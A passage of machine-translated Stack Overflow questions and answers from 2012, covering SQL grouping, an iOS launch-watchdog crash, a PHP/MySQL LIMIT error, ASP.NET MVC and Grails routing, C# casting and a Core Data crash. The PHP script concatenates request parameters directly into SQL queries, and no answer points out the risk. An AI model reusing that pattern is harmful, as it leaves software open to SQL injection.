    select c1.player, c2.player as player2, COUNT(*) as gamecount
        from games c1
        inner join games c2
           on c1.ID = c2.id
           and c1.player<>c2.player

    group by c1.player, c2.player

select * from gamecount topscore
where not exists
(select * from gamecount high 
where high.player1 = topscore.player1 
and high.gamecount>topscore.gamecount)
order by player1, gamecount desc

drop temporary table gamecount
drop temporary table games 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:17:35.647

```
select (case when player1< player2 then player1 else player2 end) first_player, 
(case when player1 > player2 then player1 else player2 end) second_player, 
count(*) games
 from game
where (player1 = 1 or player2 = 1) 
group by first_player, second_player
order by games desc
limit 1 
```

# ios - SCNetworkReachabilityGetFlags 导致崩溃？

> ID：12213082
> 
> 赞同：0
> 
> 时间：2012-08-31T09:59:57.280
> 
> 标签：ios, networking, crash

我使用 SCNetworkReachabilityGetFlags 来获取网络标志，我曾经工作得很好。但有时（通常不）它会在新 ipad 上崩溃。这是通话崩溃日志：

> CrashReporter 密钥：33f4ab575102aa60283b0dea73af84fbf45cb760 硬件型号：iPad3,3
> 
> 代码类型：ARM（本机）父进程：launchd [1]
> 
> 日期/时间：2012-08-31 15:38:09.338 +0800 操作系统版本：iPhone OS 5.1.1 (9B206) 报告版本：104
> 
> 异常类型：00000020 异常代码：0x8badf00d 突出显示的线程：0
> 
> 应用程序特定信息：com.oohla.HuaShangNews 未能及时启动
> 
> 已用总 CPU 时间（秒）：2.120（用户 2.120，系统 0.000），14% CPU 已用应用程序 CPU 时间（秒）：0.024，0% CPU
> 
> Thread 0 name: Dispatch queue: com.apple.main-thread Thread 0: 0
> libsystem_kernel.dylib 0x350ca054 semaphore_wait_trap + 8 1
> libdispatch.dylib 0x3132f1c0 _dispatch_semaphore_wait_slow + 184 2 libdispatch.dylib 0x3132f1f4 dispatch_semaphore_wait$VARIANT$mp + 32 3 libxpc.dylib
> 0x3058f89a xpc_connection_send_message_with_reply_sync + 206 4
> SystemConfiguration 0x36d18be6 _reach_server_target_status + 938 5 SystemConfiguration 0x36d19d56 **SCNetworkReachabilityServer_targetStatus + 14 6 SystemConfiguration 0x36d02aee __SCNetworkReachabilityGetFlags + 198 7 SystemConfiguration 0x36d03f7a SCNetworkReachabilityGetFlags + 190 8 HuaShangQ_iPhone
> 0x0005ed14 -[Reachability currentReachabilityStatus] + 152 9
> HuaShangQ_iPhone 0x000f39b4 -[HSStatManager getCurrntNet] + 52 10 HuaShangQ_iPhone 0x000f2b6e -[HSStatManager startSystem] + 322 11 HuaShangQ_iPhone 0x000f2068 -[HSStatManager entry] + 216 12 HuaShangQ_iPhone
> 0x0000dc6a -[AppDelegate application:didFinishLaunchingWithOptions:] ( AppDelegate.m:47) 13 UIKit 0x35142ca4 -[UIApplication _callInitializationDelegatesForURL:payload:suspended:] + 1176 14 UIKit 0x3513c7d6 -[UIApplication _runWithURL:payload:launchOrientation:statusBarStyle:statusBarHidden:] + 402 15 UIKit 0x3510aabc -[UIApplication 句柄: ] + 1004 16 UIKit
> 0x3510a560 -[UIApplication sendEvent:] + 48 17 UIKit
> 0x35109f34 _UIApplicationHandleEvent + 5820 18 GraphicsServices
> 0x32ca7224 PurpleEventCallback + 876 19 CoreFoundation
> 0x32bd751c __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE1_PERFORM_FUNCTION** + 32 20 CoreFoundation 0x32bd74be __CFRunLoopDoSource1 + 134 21 CoreFoundation 0x32bd630c __CFRunLoopRun + 1364 22 CoreFoundation
> 0x32b5949e CFRunLoopRunSpecific + 294 23 CoreFoundation
> 0x32b59366 CFRunLoopRunInMode + 98 24 UIKit
> 0x3513b864 -[UIApplication_run] + 544 25 UIKit
> 0x35138cce UIApplicationMain + 1074 26 HuaShangQ_iPhone
> 0x0000e520 main (main.m:17) 27 HuaShangQ_iPhone
> 0x00003310 开始 + 32

如何避免帮助请。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T02:21:38.153

您可能需要调查这篇[与 0x8badf00d 和 application:didFinishLaunchingWithOptions: 相关的帖子，](https://stackoverflow.com/questions/7822988/app-failed-to-resume-in-time-and-hangs)因为崩溃 ASI 表明您的应用**未能及时启动**。

# php - SQL 语法错误 urgnet

> ID：12213084
> 
> 赞同：-8
> 
> 时间：2012-08-31T09:59:59.280
> 
> 标签：php, mysql

我有这个报告

> 您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的“-5,5”附近使用正确的语法

而且似乎找不到错误。

这是脚本很乐意得到任何帮助。

```
<?
require_once("conn.php");
require_once("includes.php");
require_once("templates/HeaderTemplate.php");
require_once("pageList.php");
//  ADVANCED SEARCH
//require_once("advanced.php");
//require_once("templates/AdvancedSearchTemplate.php");
$showall = false;
if ($_REQUEST['stateid']) {
    $sql = "Select full_name From states where state_id = ".$_REQUEST['stateid'];
    $myr = mysql_query($sql) or die(mysql_error());
    $isAny = mysql_num_rows($myr);
    $state_name = mysql_fetch_array($myr);
    $show = "<table width=\"550\"><tr><td>Showing Listings For <font color=\"FF0000\" >$state_name[full_name]</font></td></tr></table>"; 
}       
else {
    $show = "Showing All Listings"; 
    $showall = true;
}

//print "The Value Of ... ".$isAny;
//echo "<BR><b>&nbsp;&nbsp;&nbsp;".$show;
if ($_REQUEST['stateid'])
    $addsql = "and re_listings.state_id=".$_REQUEST['stateid'];
else
    $addsql ="";
$q1 = "select * from re_listings, re_agents, re_priority where re_listings.AgentID = re_agents.AgentID and re_agents.PriorityLevel = re_priority.PriorityLevel and re_agents.AccountStatus = 'active' ".$addsql;
$rsQ = mysql_query($q1);
$total_records = mysql_num_rows($rsQ);
if($total_records== 0)
{
        $ListingTable = "<table align=center width=500 cellspacing=0>\n";
    $ListingTable .= "<tr>\n<td>$links</td></tr>\n\t";
    $ListingTable .= "<tr>\n<td>&nbsp;</td></tr>\n\t";
    $ListingTable .= "</tr>\n</table>\n\n";
    $ListingTable .= "<br><br><center><Strong>No Results Was Found!</Strong></center>";
require_once("templates/HeaderTemplate.php");
require_once("templates/SearchTemplate.php");   
require_once("templates/FooterTemplate.php");
}
$records_per_page = 5; // no of records per page
$current_page_no = 1;

    if ($_REQUEST['page'])
    {
        $current_page_no = $_REQUEST['page'];
    } 
    $pageL = new pageList($total_records, $records_per_page, $current_page_no);
    $pageL->generate();
//print $addsql."<BR>";
//print "startRecord: ".$pageL->startRecord;
$q2 = "select * from re_listings, re_agents, re_priority where re_listings.AgentID = re_agents.AgentID and re_agents.PriorityLevel = re_priority.PriorityLevel and re_agents.AccountStatus = 'active' ".$addsql." order by visits desc LIMIT $pageL->startRecord,$pageL->numOfRows";
$r1 = mysql_query($q2) or die(mysql_error());
$lrows = mysql_num_rows($r1);
if($lrows > '0')
{
    $ListingTable .= "<table align=center width=500 cellspacing=0>\n";

    $ListingTable .= "<tr>\n<td width=75>&nbsp;</td>\n\t";

//  $ListingTable .= "<td width=200 align=center><a class=BlackLink href=\"search.php?c=$_GET[c]&s=$_GET[s]&AgentID=$_GET[AgentID]&search_city=$_GET[search_city]&search_state=$_GET[search_state]&search_country=$_GET[search_country]&search_PropertyType=$_GET[search_PropertyType]&MinPrice=$_GET[MinPrice]&MaxPrice=$_GET[MaxPrice]&rooms1=$_GET[rooms1]&rooms2=$_GET[rooms2]&bath1=$_GET[bath1]&bath2=$_GET[bath2]&before=$_GET[before]&school=$_GET[school]&transit=$_GET[transit]&park=$_GET[park]&ocean_view=$_GET[ocean_view]&lake_view=$_GET[lake_view]&mountain_view=$_GET[mountain_view]&ocean_waterfront=$_GET[ocean_waterfront]&lake_waterfront=$_GET[lake_waterfront]&river_waterfront=$_GET[river_waterfront]&city=1&page=$_REQUEST[page]\">address</a></td>\n\t";

//  $ListingTable .= "<td width=125 align=center><a class=BlackLink href=\"search.php?c=$_GET[c]&s=$_GET[s]&AgentID=$_GET[AgentID]&search_city=$_GET[search_city]&search_state=$_GET[search_state]&search_country=$_GET[search_country]&search_PropertyType=$_GET[search_PropertyType]&MinPrice=$_GET[MinPrice]&MaxPrice=$_GET[MaxPrice]&rooms1=$_GET[rooms1]&rooms2=$_GET[rooms2]&bath1=$_GET[bath1]&bath2=$_GET[bath2]&before=$_GET[before]&school=$_GET[school]&transit=$_GET[transit]&park=$_GET[park]&ocean_view=$_GET[ocean_view]&lake_view=$_GET[lake_view]&mountain_view=$_GET[mountain_view]&ocean_waterfront=$_GET[ocean_waterfront]&lake_waterfront=$_GET[lake_waterfront]&river_waterfront=$_GET[river_waterfront]&r=1&page=$_REQUEST[page]\">bed, bath, garage</a></td>\n\t";

//  $ListingTable .= "<td align=center width=100><a class=BlackLink href=\"search.php?c=$_GET[c]&s=$_GET[s]&AgentID=$_GET[AgentID]&search_city=$_GET[search_city]&search_state=$_GET[search_state]&search_country=$_GET[search_country]&search_PropertyType=$_GET[search_PropertyType]&MinPrice=$_GET[MinPrice]&MaxPrice=$_GET[MaxPrice]&rooms1=$_GET[rooms1]&rooms2=$_GET[rooms2]&bath1=$_GET[bath1]&bath2=$_GET[bath2]&before=$_GET[before]&school=$_GET[school]&transit=$_GET[transit]&park=$_GET[park]&ocean_view=$_GET[ocean_view]&lake_view=$_GET[lake_view]&mountain_view=$_GET[mountain_view]&ocean_waterfront=$_GET[ocean_waterfront]&lake_waterfront=$_GET[lake_waterfront]&river_waterfront=$_GET[river_waterfront]&p=1&page=$_REQUEST[page]\">price</a></td>\n";

    $ListingTable .= "</tr>\n</table>\n\n";
    $ListingTable .= "<table align=center width=500 border=0 bordercolor=#336699 rules=rows cellspacing=0>\n";

$start = $pageL->startRecord+1;
$end = $records_per_page*$current_page_no;
$totalpages = $pageL->getTotalPage();
if ($current_page_no==$totalpages)
$end = $pageL->getTotalRecords();
    $rec_info = "<strong>Showing Listings $start - $end</strong>";
    $ListingTable .= "<tr>\n<td colspan=4>$rec_info</td></tr>\n\t";

    while($a1 = mysql_fetch_array($r1))
    {

        $ListingTable .= "<tr style=\"border-width:1; border-color:blue\" onMouseOver=\"this.style.background='#FFFFFF'; this.style.cursor='hand'\" onMouseOut=\"this.style.background='white'\" onClick=\"window.open('info.php?id=$a1[ListingID]', '_top')\">\n\t";

        $ListingTable .= "<td height=60>";
        $ListingTable .= "<table align=center width=\"100%\">\n";

        $ListingTable .= "<TR style=\"background-color:#001592; color:white; font-family:verdana; font-size:11; font-weight:bold; height=20px \">\n<TD colspan=4>\n$a1[PriorityName] listing</TD>\n</TR>\n";
//      $ListingTable .= "<caption align=left><span class=RedLink>$a1[PriorityName] listing</span></caption>\n";
        $ListingTable .= "<tr>\n\t<td width=75>";
//Price formatting
        $MyPrice = number_format($a1[Price], 2, ".", "'");
//State Formatting
    if(empty($a1[state_id]))
        $state = "Not Available";
    else
        {
            $state_id = $a1[state_id];
            $sql = "Select full_name from states where state_id=$state_id";
            $myrs = mysql_query($sql) or die(mysql_error());
            $statename = mysql_fetch_array($myrs);
            $state = $statename[full_name];

        }

    $ListingTable =$ListingTable."<TR bgcolor=\"D2EEFF\"><TD width=\"20%\"><b>Country: </b></TD><TD width=\"20%\"> $a1[country]</TD>";
    $ListingTable =$ListingTable."<TD width=\"20%\"><b>State: </b></TD><TD width=\"20%\">$state</TD></TR>";
    $ListingTable =$ListingTable."<TR bgcolor=\"FFFFFF\">\n\t<td valign=top width=\"20%\"><B>City: </b></td><td valign=top width=\"20%\">$a1[city]</td>";
    $ListingTable =$ListingTable."<TD width=\"20%\"><b>Address: </b></TD><TD width=\"20%\"> $a1[address]</TD></TR>";
    $ListingTable =$ListingTable."<TR bgcolor=\"D2EEFF\"><TD width=\"20%\"><b>Price: </b></TD><TD width=\"20%\"> $$MyPrice</TD>";
    $ListingTable =$ListingTable."<TD width=\"20%\"><b>SqMeters: </b></TD><TD width=\"20%\"> $a1[SquareMeters] sq.m.</TD</TR>";
        $ListingTable .= "</td>\n\t";
        $ListingTable .= "</tr>\n";

        $ListingTable .= "<HR>";
        $ListingTable .= "</table>\n\n</td>\n</tr>\n\n";
    }
    $ListingTable .= "</table>";

}
else
{
    $ListingTable = "<table align=center width=500 cellspacing=0>\n";
//  $ListingTable .= "<tr>\n<td>$links</td></tr>\n\t";
    $ListingTable .= "<tr>\n<td>&nbsp;</td></tr>\n\t";
    $ListingTable .= "</tr>\n</table>\n\n";
    $show = "<table align=center width=550 cellspacing=0><tr><td><br><br><center><Strong>No Results Was Found!</Strong></center></td></tr></table>";

}   
echo "<BR><b>&nbsp;&nbsp;&nbsp;".$show;
/*
 if ($_REQUEST['stateid'] == 0){ 
echo "<table border=0 align=center><tr><td align=center><object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"400\" height=\"275\">
  <param name=\"movie\" value=\"usmap.swf\">
  <param name=\"quality\" value=\"high\">
  <embed src=\"usmap.swf\" quality=\"high\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" type=\"application/x-shockwave-flash\" width=\"500\" height=\"325\"></embed>\"
</object></td></tr></table>";
 }*/

require_once("templates/SearchTemplate.php");
require_once("templates/FooterTemplate.php");
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:09:38.133

试试这个，

```
$start_record = ($pageL->startRecord>=0) ? $pageL->startRecord : 0;

    $q2 = "

    select 
        * 
    from 
        re_listings, 
        re_agents, 
        re_priority 
    where 
        re_listings.AgentID = re_agents.AgentID 
        and re_agents.PriorityLevel = re_priority.PriorityLevel 
        and re_agents.AccountStatus = 'active' 
        ".$addsql." 
    order by 
        visits desc 
    LIMIT 
        $start_record,$pageL->numOfRows
    "; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:04:27.113

尽管在代码中并不明显，但我认为导致错误的查询是这个：

```
$q2 = "

select 
    * 
from 
    re_listings, 
    re_agents, 
    re_priority 
where 
    re_listings.AgentID = re_agents.AgentID 
    and re_agents.PriorityLevel = re_priority.PriorityLevel 
    and re_agents.AccountStatus = 'active' 
    ".$addsql." 
order by 
    visits desc 
LIMIT 
    $pageL->startRecord,$pageL->numOfRows
"; 
```

您可能在限制子句中传递了一个负值，这是您无法做到的。

您应该检查是否`$pageL->startRecord`小于 0，如果是，请将其更改为零。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T11:55:08.507

```
$ListingTable = "<table align=center width=500 cellspacing=0>\n"; 
```

我想你忘了放“。” 对此。

```
$ListingTable .= "<table align=center width=500 cellspacing=0>\n"; 
```

在 Dreamweaver 行号中。123

# asp.net-mvc - 如何在asp.net mvc 4中自定义路由

> ID：12213086
> 
> 赞同：2
> 
> 时间：2012-08-31T10:00:08.860
> 
> 标签：asp.net-mvc, asp.net-mvc-4, asp.net-mvc-routing

我想创建一个像这样路由的自定义路由

当客户端请求`http://server/logout` 时，它将被定向到 AccountController 控制器和 LogOff 方法

如何在 ASP.MVC 4 中执行此操作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T10:02:24.597

您可以在默认路由**之前**插入以下路由定义：

```
routes.MapRoute(
    name: "LogOut",
    url: "logout",
    defaults: new { controller = "Account", action = "LogOff" }
); 
```

# c# - c#中的变量对象

> ID：12213089
> 
> 赞同：3
> 
> 时间：2012-08-31T10:00:20.637
> 
> 标签：c#, variables, object, typeof

我有一个名为 gameObject 的类，它的一个属性被调用`component`并且是类型`object`：

```
public object component; 
```

我正试图用它`object`作为一个对象，它可以保存你给它的任何类的对象。例如

```
unit c = new unit(...)
gameObject test = new gameObject(...)
test.component = c; 
```

我想通过组件对象使用c对象。例如

```
if(test.component==typeof(unit))
    test.component.Draw();//draw is a function of the unit object 
```

这可能吗？我该怎么做？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T10:04:12.120

`typeof(unit)`也是一个对象，它不同于`component`. 你应该这样做`component.GetType()`：

```
if(test.component.GetType()==typeof(unit)) 
```

这不会检查派生类型，但会：

```
if(test.component is unit) 
```

尽管如此，这并不能让你在`Draw`没有强制转换的情况下调用。最简单的同时check和cast的方法如下：

```
unit u = test.component as unit;
if (u != null) {
    u.Draw();
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-31T10:02:29.183

是的，这叫做铸造。像这样：

```
if(test.component is unit)
  ((unit)test.component).Draw(); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-08-31T10:03:37.200

使用接口并使单元类实现该接口。在接口中定义 Draw() 方法，并将组件声明为您定义的接口的类型。

```
public interface IDrawable
{
 void Draw();
}

public IDrawable component;

public class unit : IDrawable
... 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-31T10:02:57.243

if (test.component is unit) ((unit)(test.component)).Draw();

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-31T10:10:01.647

正如其他人所说-您可以将所有内容都投射到`Object`. 但是你应该使用接口的一些基类来确保没有人会发送给你`Int32`或其他一些意想不到的类型。但是如果所有支持的类型都有一些通用的方法，那么最好把它放在接口中。所以你可以`Draw()`在没有铸造的情况下做任何事情，甚至不知道它到底是什么。

具有空接口的变体只是强制执行正确的类型：

```
interface IComponent
{
}
class unit : IComponent
{
    //...
}
class enemy : IComponent
{
    //...
}
class gameObject
{
    IComponent component;//now only objects inheriting IComponent can be assigned here

    public void DrawComponent()
    {
        unit u = component as unit;
        if (u != null) {
            u.Draw();
        }
        enemy e = component as enemy;
        if (e != null) {
            e.DrawIfVisible();
        }
    }
} 
```

具有声明通用功能的接口的变体：

```
interface IDrawable
{
    void Draw();
}
class unit : IDrawable
{
    public void Draw(){;}
    //...
}
class enemy : IDrawable
{
    public void Draw(){;}
    //...
}

class gameObject
{
    IDrawable component;

    public void DrawComponent()
    {
        //now you don't need to care what type component really is
        //it has to be IDrawable to be assigned to test
        //and because it is IDrawable, it has to have Draw() method
        if (component != null) {
            component.Draw();
        }
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-31T10:05:02.317

要使用对象的特定行为，您必须将其转换为特定类型。使用变量引用它，`object`您只能将其用作`object`实例。

# c# - 如何从对话表单中关闭 mdiparent 表单（如许可证表单）

> ID：12213092
> 
> 赞同：0
> 
> 时间：2012-08-31T10:00:32.557
> 
> 标签：c#

如果用户单击许可证表单上的退出按钮或关闭它，我正在尝试关闭我的主表单。

我在退出按钮上尝试了这段代码，但没有奏效：

//------------------------------------------------ --------------------

```
 private void button2_Click(object sender, EventArgs e)
    {
        Form1 aa=new Form1();
        aa.Close();
        this.Close();
    } 
```

//------------------------------------------------ --------------------

如果有人可以帮助我，我将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:03:41.430

如果该父表单是您应用程序中的主表单，那么您可以使用

```
Application.Exit(); 
```

要了解更多信息[，请访问此处](http://msdn.microsoft.com/en-us/library/system.windows.forms.application.exit%28v=vs.71%29.aspx)。

# grails - 多个 grails url 映射

> ID：12213095
> 
> 赞同：0
> 
> 时间：2012-08-31T10:00:42.317
> 
> 标签：grails, url-routing

在我的 Grails 应用程序中，我有以下控制器和操作

```
class FestivalController {

  def show() {
    [festival: Festival.get(params.id)]
  }
} 
```

我希望以下所有 URL 都映射到此控制器

```
/festival/show/1
/festival/show/1/glastonbury
/1/music/glastonbury 
```

where`glastonbury`和`music`分别是节日的名称和类型。请注意，实际上只需要 ID (1) 来识别节日，因此出于 SEO 和（URL 的）可读性的原因，名称和类型包含在 URL 中。

我尝试使用以下 URL 映射来支持这些不同的 URL

```
// this supports the 3rd mapping above
name showFestival: "/$id/$type?/$name?" {
    controller = "festival"
    action = "show"
}

// this supports the 1st mapping above
"/$controller/$action?/$id?/$name?"{
    constraints {           
    }
} 
```

这些支持第一个和第三个 URL 映射，但如果我尝试第二个

```
/festival/show/1/glastonbury 
```

它不起作用。理想情况下，我希望 Grails 始终生成以下形式的 URL：

```
/1/music/glastonbury 
```

当我使用`g.createLink`or时`g.link`，但我还希望以下 URL 映射到此操作（出于历史原因）：

```
/festival/show/1
/festival/show/1/glastonbury 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T11:45:43.307

没有看到你的其他映射规则，很难知道什么是相关的，什么是不相关的......你看到的行为与通常的优先规则不一致，我[不久前从源中提取了](http://grails.1312388.n4.nabble.com/URL-Mapping-question-tp3556768p3565451.html)它，它说当两个映射可以应用于相同的传入 URI，获胜的是具有以下内容的 URI：

1.  更少的双通配符（`**`或`$var**`），或者如果两者相等，则
2.  更少的单个通配符（`*`或`$var`），或者如果两者相等，则
3.  更多非通配符路径段，或者如果两者相等，则
4.  最左边的通配符（`/foo/*/baz`beats `/foo/bar/*`），或者如果它们的最左边的通配符在同一个地方，那么
5.  一个拥有更多`constraints`

根据这些规则，`/festival/show/1/glastonbury`仅匹配第二个映射，因此应该可以正常工作，但同时`/festival/show/1`匹配两者，因此应该被（更少的通配符）拾取`/$id/$type/$name`，从而导致`[controller:'festival', action:'show', id:'festival', type:'show', name:'1']`.

添加一个明确的规则`"/festival/$action?/$id?/$name?"(controller:'festival')`应该解决问题，因为`/festival/show/1`这将匹配这个映射和`/id/type/name`一个，但是明确的`/festival/...`映射有更多的非通配符路径段（1 vs none）。

# objective-c - 使用 deleteObject 时的 EXC_BAD_ACCESS (SIGSEGV)：在核心数据存储上

> ID：12213096
> 
> 赞同：5
> 
> 时间：2012-08-31T10:00:43.880
> 
> 标签：objective-c, macos, core-data, exc-bad-access

在我的应用程序中，我正在从两个核心数据存储中删除（或尝试删除）所有记录，然后再添加新的记录。它们是 2 个简单的存储，包含与地址簿中的记录相关的数据（VIContacts 包含联系人 ID 和 vcard 哈希（整数），VIGroup 包含组 ID 和组名称）。

为了从商店中删除所有联系人，我在一个名为的方法中使用了这段代码`-clear:`：

```
 NSArray *allOldRowsInVIContacts = [[mainContext fetchObjectsForEntityName:[VIContact name]
                                               includePropertyValues:NO
                                               withPredicate:nil] copy];

for (NSManagedObject *obj in allOldRowsInVIContacts) {
    @try {
        [mainContext deleteObject:obj];
    }
    @catch (NSException *exception) {
        NSLog(@"Exception Triggered: %@", exception.reason);
        [NSException raise:exception.reason format:@"thrown on vicontacts."];
    }
}

[allOldRowsInVIContacts release];

if (![mainContext save:error]) {
    return NO;
}

NSArray *allOldRowsInVIGroups = [[mainContext fetchObjectsForEntityName:[VIGroup name]
                                                 includePropertyValues:NO
                                                         withPredicate:nil] copy];

NSLog(@"all rows in VIGroups count: %d", [allOldRowsInVIGroups count]);

for (NSManagedObject *obj in allOldRowsInVIGroups) {
    @try {
        [mainContext deleteObject:obj];
    }
    @catch (NSException *exception) {
        NSLog(@"Exception Triggered: %@", exception.reason);
        [NSException raise:exception.reason format:@"thrown on vigroups."];
    }
}

[allOldRowsInVIGroups release];

NSLog(@"at the end of -clear: Going to save context.");

/* SAVE */
if (![mainContext save:error]) {
    return NO;
} 
```

该应用程序似乎总是在 VIGroup 区域附近崩溃。

崩溃日志如下：

```
 Crashed Thread:  5  Dispatch queue: com.apple.root.default-priority

Exception Type:  EXC_BAD_ACCESS (SIGSEGV)
Exception Codes: KERN_INVALID_ADDRESS at 0x0000000000000000
...
Thread 5 Crashed:: Dispatch queue: com.apple.root.default-priority
0   com.apple.CoreFoundation        0x00007fff82532574 __CFBasicHashRehash + 1412
1   com.apple.CoreFoundation        0x00007fff8252b41b __CFBasicHashAddValue + 75
2   com.apple.CoreFoundation        0x00007fff82531f78 CFBasicHashAddValue + 3176
3   com.apple.CoreFoundation        0x00007fff82547899 CFSetAddValue + 121
4   com.apple.CoreData              0x00007fff8520e3dc -[NSManagedObjectContext deleteObject:] + 220
5   com.andrei.AddressBookApp       0x000000010004da9a -[AddressBookFrameworkSyncHelper clear:] + 490
6   com.andrei.AddressBookApp       0x000000010004c8f9 +[AddressBookFrameworkSyncHelper saveSnapshot:] + 105
7   com.andrei.AddressBookApp       0x000000010002d417 -[SLSyncOperation main] + 2631
8   com.apple.Foundation            0x00007fff8b68dbb6 -[__NSOperationInternal start] + 684 
```

**其他信息**

我使用 Instruments 寻找僵尸，但没有出现。应用程序中有一些泄漏，但与 Core Data 无关。

VIGroup 和 VIContact 之间没有关系。它们是独立的、独立的实体。

奇怪的是，代码似乎永远不会进入@catch，因为控制台`Exception triggered: ...`在崩溃之前不会接收任何消息。

不时抛出错误。该应用在 Lion 上似乎更稳定，但在 Mountain Lion 和 Snow Leopard 上却经常崩溃。

谢谢。任何帮助是极大的赞赏。

## 更新了更多代码

**MOC 创建：**

我创建了一个“NSOperation”（“SLSyncOperation”）并将其添加到“NSOperationQueue”中。这`SLSyncOperation`被添加到`NSOperationQueue`：

```
 [backgroundQueue setMaxConcurrentOperationCount:1];

// has a custom initializer
currentOperation = [[SLSyncOperation alloc] initWithPersistentStoreCoordinator:persistentStoreCoordinator
                                                                   andDelegate:delegate
                                                               forceRemoteSync:forceSync];

[backgroundQueue addOperation:currentOperation]; 
```

这是`main`SLSyncOperation 的方法（继承自 NSOperation）：

```
 - (void)main {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

    syncProgressTracker = [SLSyncProgressTracker sharedProgressTracker];
    syncProgressTracker.currentStatus = SLSyncStatusIdle;

    // ... some other setup and sending notifications ...

    /* Set up. */
    managedObjectModel = [NSManagedObjectModel mergedModelFromBundles:nil];
    managedObjectContext = [[NSManagedObjectContext alloc] init];

    // persistentStoreCoordinator is passed from the app delegate
    [managedObjectContext setPersistentStoreCoordinator:persistentStoreCoordinator];

    // ... continues with other logic (syncing to a server), and the end of the method is: ...

    /* Tear down. */
    [managedObjectContext release];
    managedObjectModel = nil;

    [pool drain];
} 
```

**正在使用的 MOC：**

我在单例类中使用 MOC，该类是从`SLSyncOperation`. 我假设在这种情况下，一切都发生在同一个线程中......？我将添加一些测试方法来检查这一点。

*MOC 在单例类中初始化：*

```
 + (AddressBookFrameworkSyncHelper *)sharedHelper {
    if (!_sharedAddressBookHelper) {
        _sharedAddressBookHelper = [[AddressBookFrameworkSyncHelper alloc] init];
    }

    return _sharedAddressBookHelper;
}

- (id)init {
    if (self = [super init]) {        
        mainContext = [(AddressBookAppAppDelegate *)[[NSApplication sharedApplication] delegate] managedObjectContext];
        addressBookRef = [ABAddressBook sharedAddressBook];

        // disable undo manager - uses less memory
        [mainContext setUndoManager:nil];        
    }

    return self;
} 
```

在此之后，我使用 MOC ( `mainContext`) 进行保存，将其传递给使用它的其他方法等。例如

```
 //saving
[sharedABF.mainContext save:error];

// passing it to a Core Data method
VIContact *contactToAdd = [VIContact newOrExistingContactWithID:contactID
                                                      inContext:sharedABF.mainContext
                                                          error:error];

// that method looks like this
+ (VIContact *)newOrExistingContactWithID:(NSString *)contactID inContext:(NSManagedObjectContext *)context error:(NSError **)error {    
    VIContact *theContact = [[context fetchObjectsForEntityName:[VIContact name]
                                          includePropertyValues:YES
                                                  withPredicate:
                              @"personID == %@", contactID] lastObject];

    if (theContact) {
        return [theContact retain];
    } else {
        // no contact found with that ID, return a new one
        VIContact *newContact = [[VIContact alloc] initAndInsertInContext:context];
        newContact.personID = contactID;
        return newContact;
    }
}

// and then fetch all rows in a Core Data entity and remove them
NSArray *allOldRowsInVIContacts = [mainContext fetchObjectsForEntityName:[VIContact name]
                                                   includePropertyValues:NO
                                                           withPredicate:nil];

for (NSManagedObject *obj in allOldRowsInVIContacts) {
    [mainContext deleteObject:obj];
}

if (![mainContext save:error]) {
    return NO;
} 
```

该`fetchObjectsForEntityName`方法取自[这里](http://cocoawithlove.com/2008/03/core-data-one-line-fetch.html)。

我将尝试使用您提到的那些方法从不同的线程访问该方法。希望这对您有所帮助，并为您提供有关我如何使用 MOC 的更多信息。

## 更多信息

我将创建 mainContext 的线程命名为`SLSyncOperationThread.Name set.`. 在应用程序崩溃之前，我放置了一个打印出线程名称的 NSLog。它每次都会打印出该线程的名称。所以这似乎不是一个多线程问题。特别是因为应用程序在每次达到该点时都会时不时地崩溃。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-03T11:24:23.923

尝试简单地删除文件而不是对象：

```
- (void)emptyDatabase{
    NSError * error;
    // retrieve the store URL
    NSURL * storeURL = [[self.managedObjectContext persistentStoreCoordinator] URLForPersistentStore:[[[self.managedObjectContext persistentStoreCoordinator] persistentStores] lastObject]];
    // lock the current context
    [self.managedObjectContext lock];
    [self.managedObjectContext reset];//to drop pending changes
    //delete the store from the current managedObjectContext
    if ([[self.managedObjectContext persistentStoreCoordinator] removePersistentStore:[[[self.managedObjectContext persistentStoreCoordinator] persistentStores] lastObject] error:&error])
    {
        // remove the file containing the data
        [[NSFileManager defaultManager] removeItemAtURL:storeURL error:&error];
        //recreate the store like in the  appDelegate method
        [[self.managedObjectContext persistentStoreCoordinator] addPersistentStoreWithType:NSSQLiteStoreType configuration:nil URL:storeURL options:nil error:&error];//recreates the persistent store
    }
    [self.managedObjectContext unlock];
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-05T15:06:30.957

首先，您说实体不共享关系，但它们有什么关系？

其次，您会遇到分段错误，因为正在取消引用 NULL 指针。

第三，你有多少个 NSManagedObjectContext 对象，它们是如何被访问的？

看起来您的`clear`方法是从内部调用的，`NSOperationQueue`但它没有在主线程上运行。您不应该同时从多个线程访问单个 MOC。

我最初的赌注（没有更多信息）是您正在从多个线程访问 MOC，这是一件非常糟糕的事情。

此外，您似乎正在使用 Matt Gallagher 的单行提取。我认为它返回 a `NSSet`，而不是`NSArray`......在这种情况下似乎并不重要，但确保您使用正确的类型总是很好。

**编辑**

不幸的是，你没有展示你是如何调用你的`clear`方法的。我敢打赌，它在您用评论替换的内容中：

```
// ... continues with other logic (syncing to a server), and the end of the method is: ... 
```

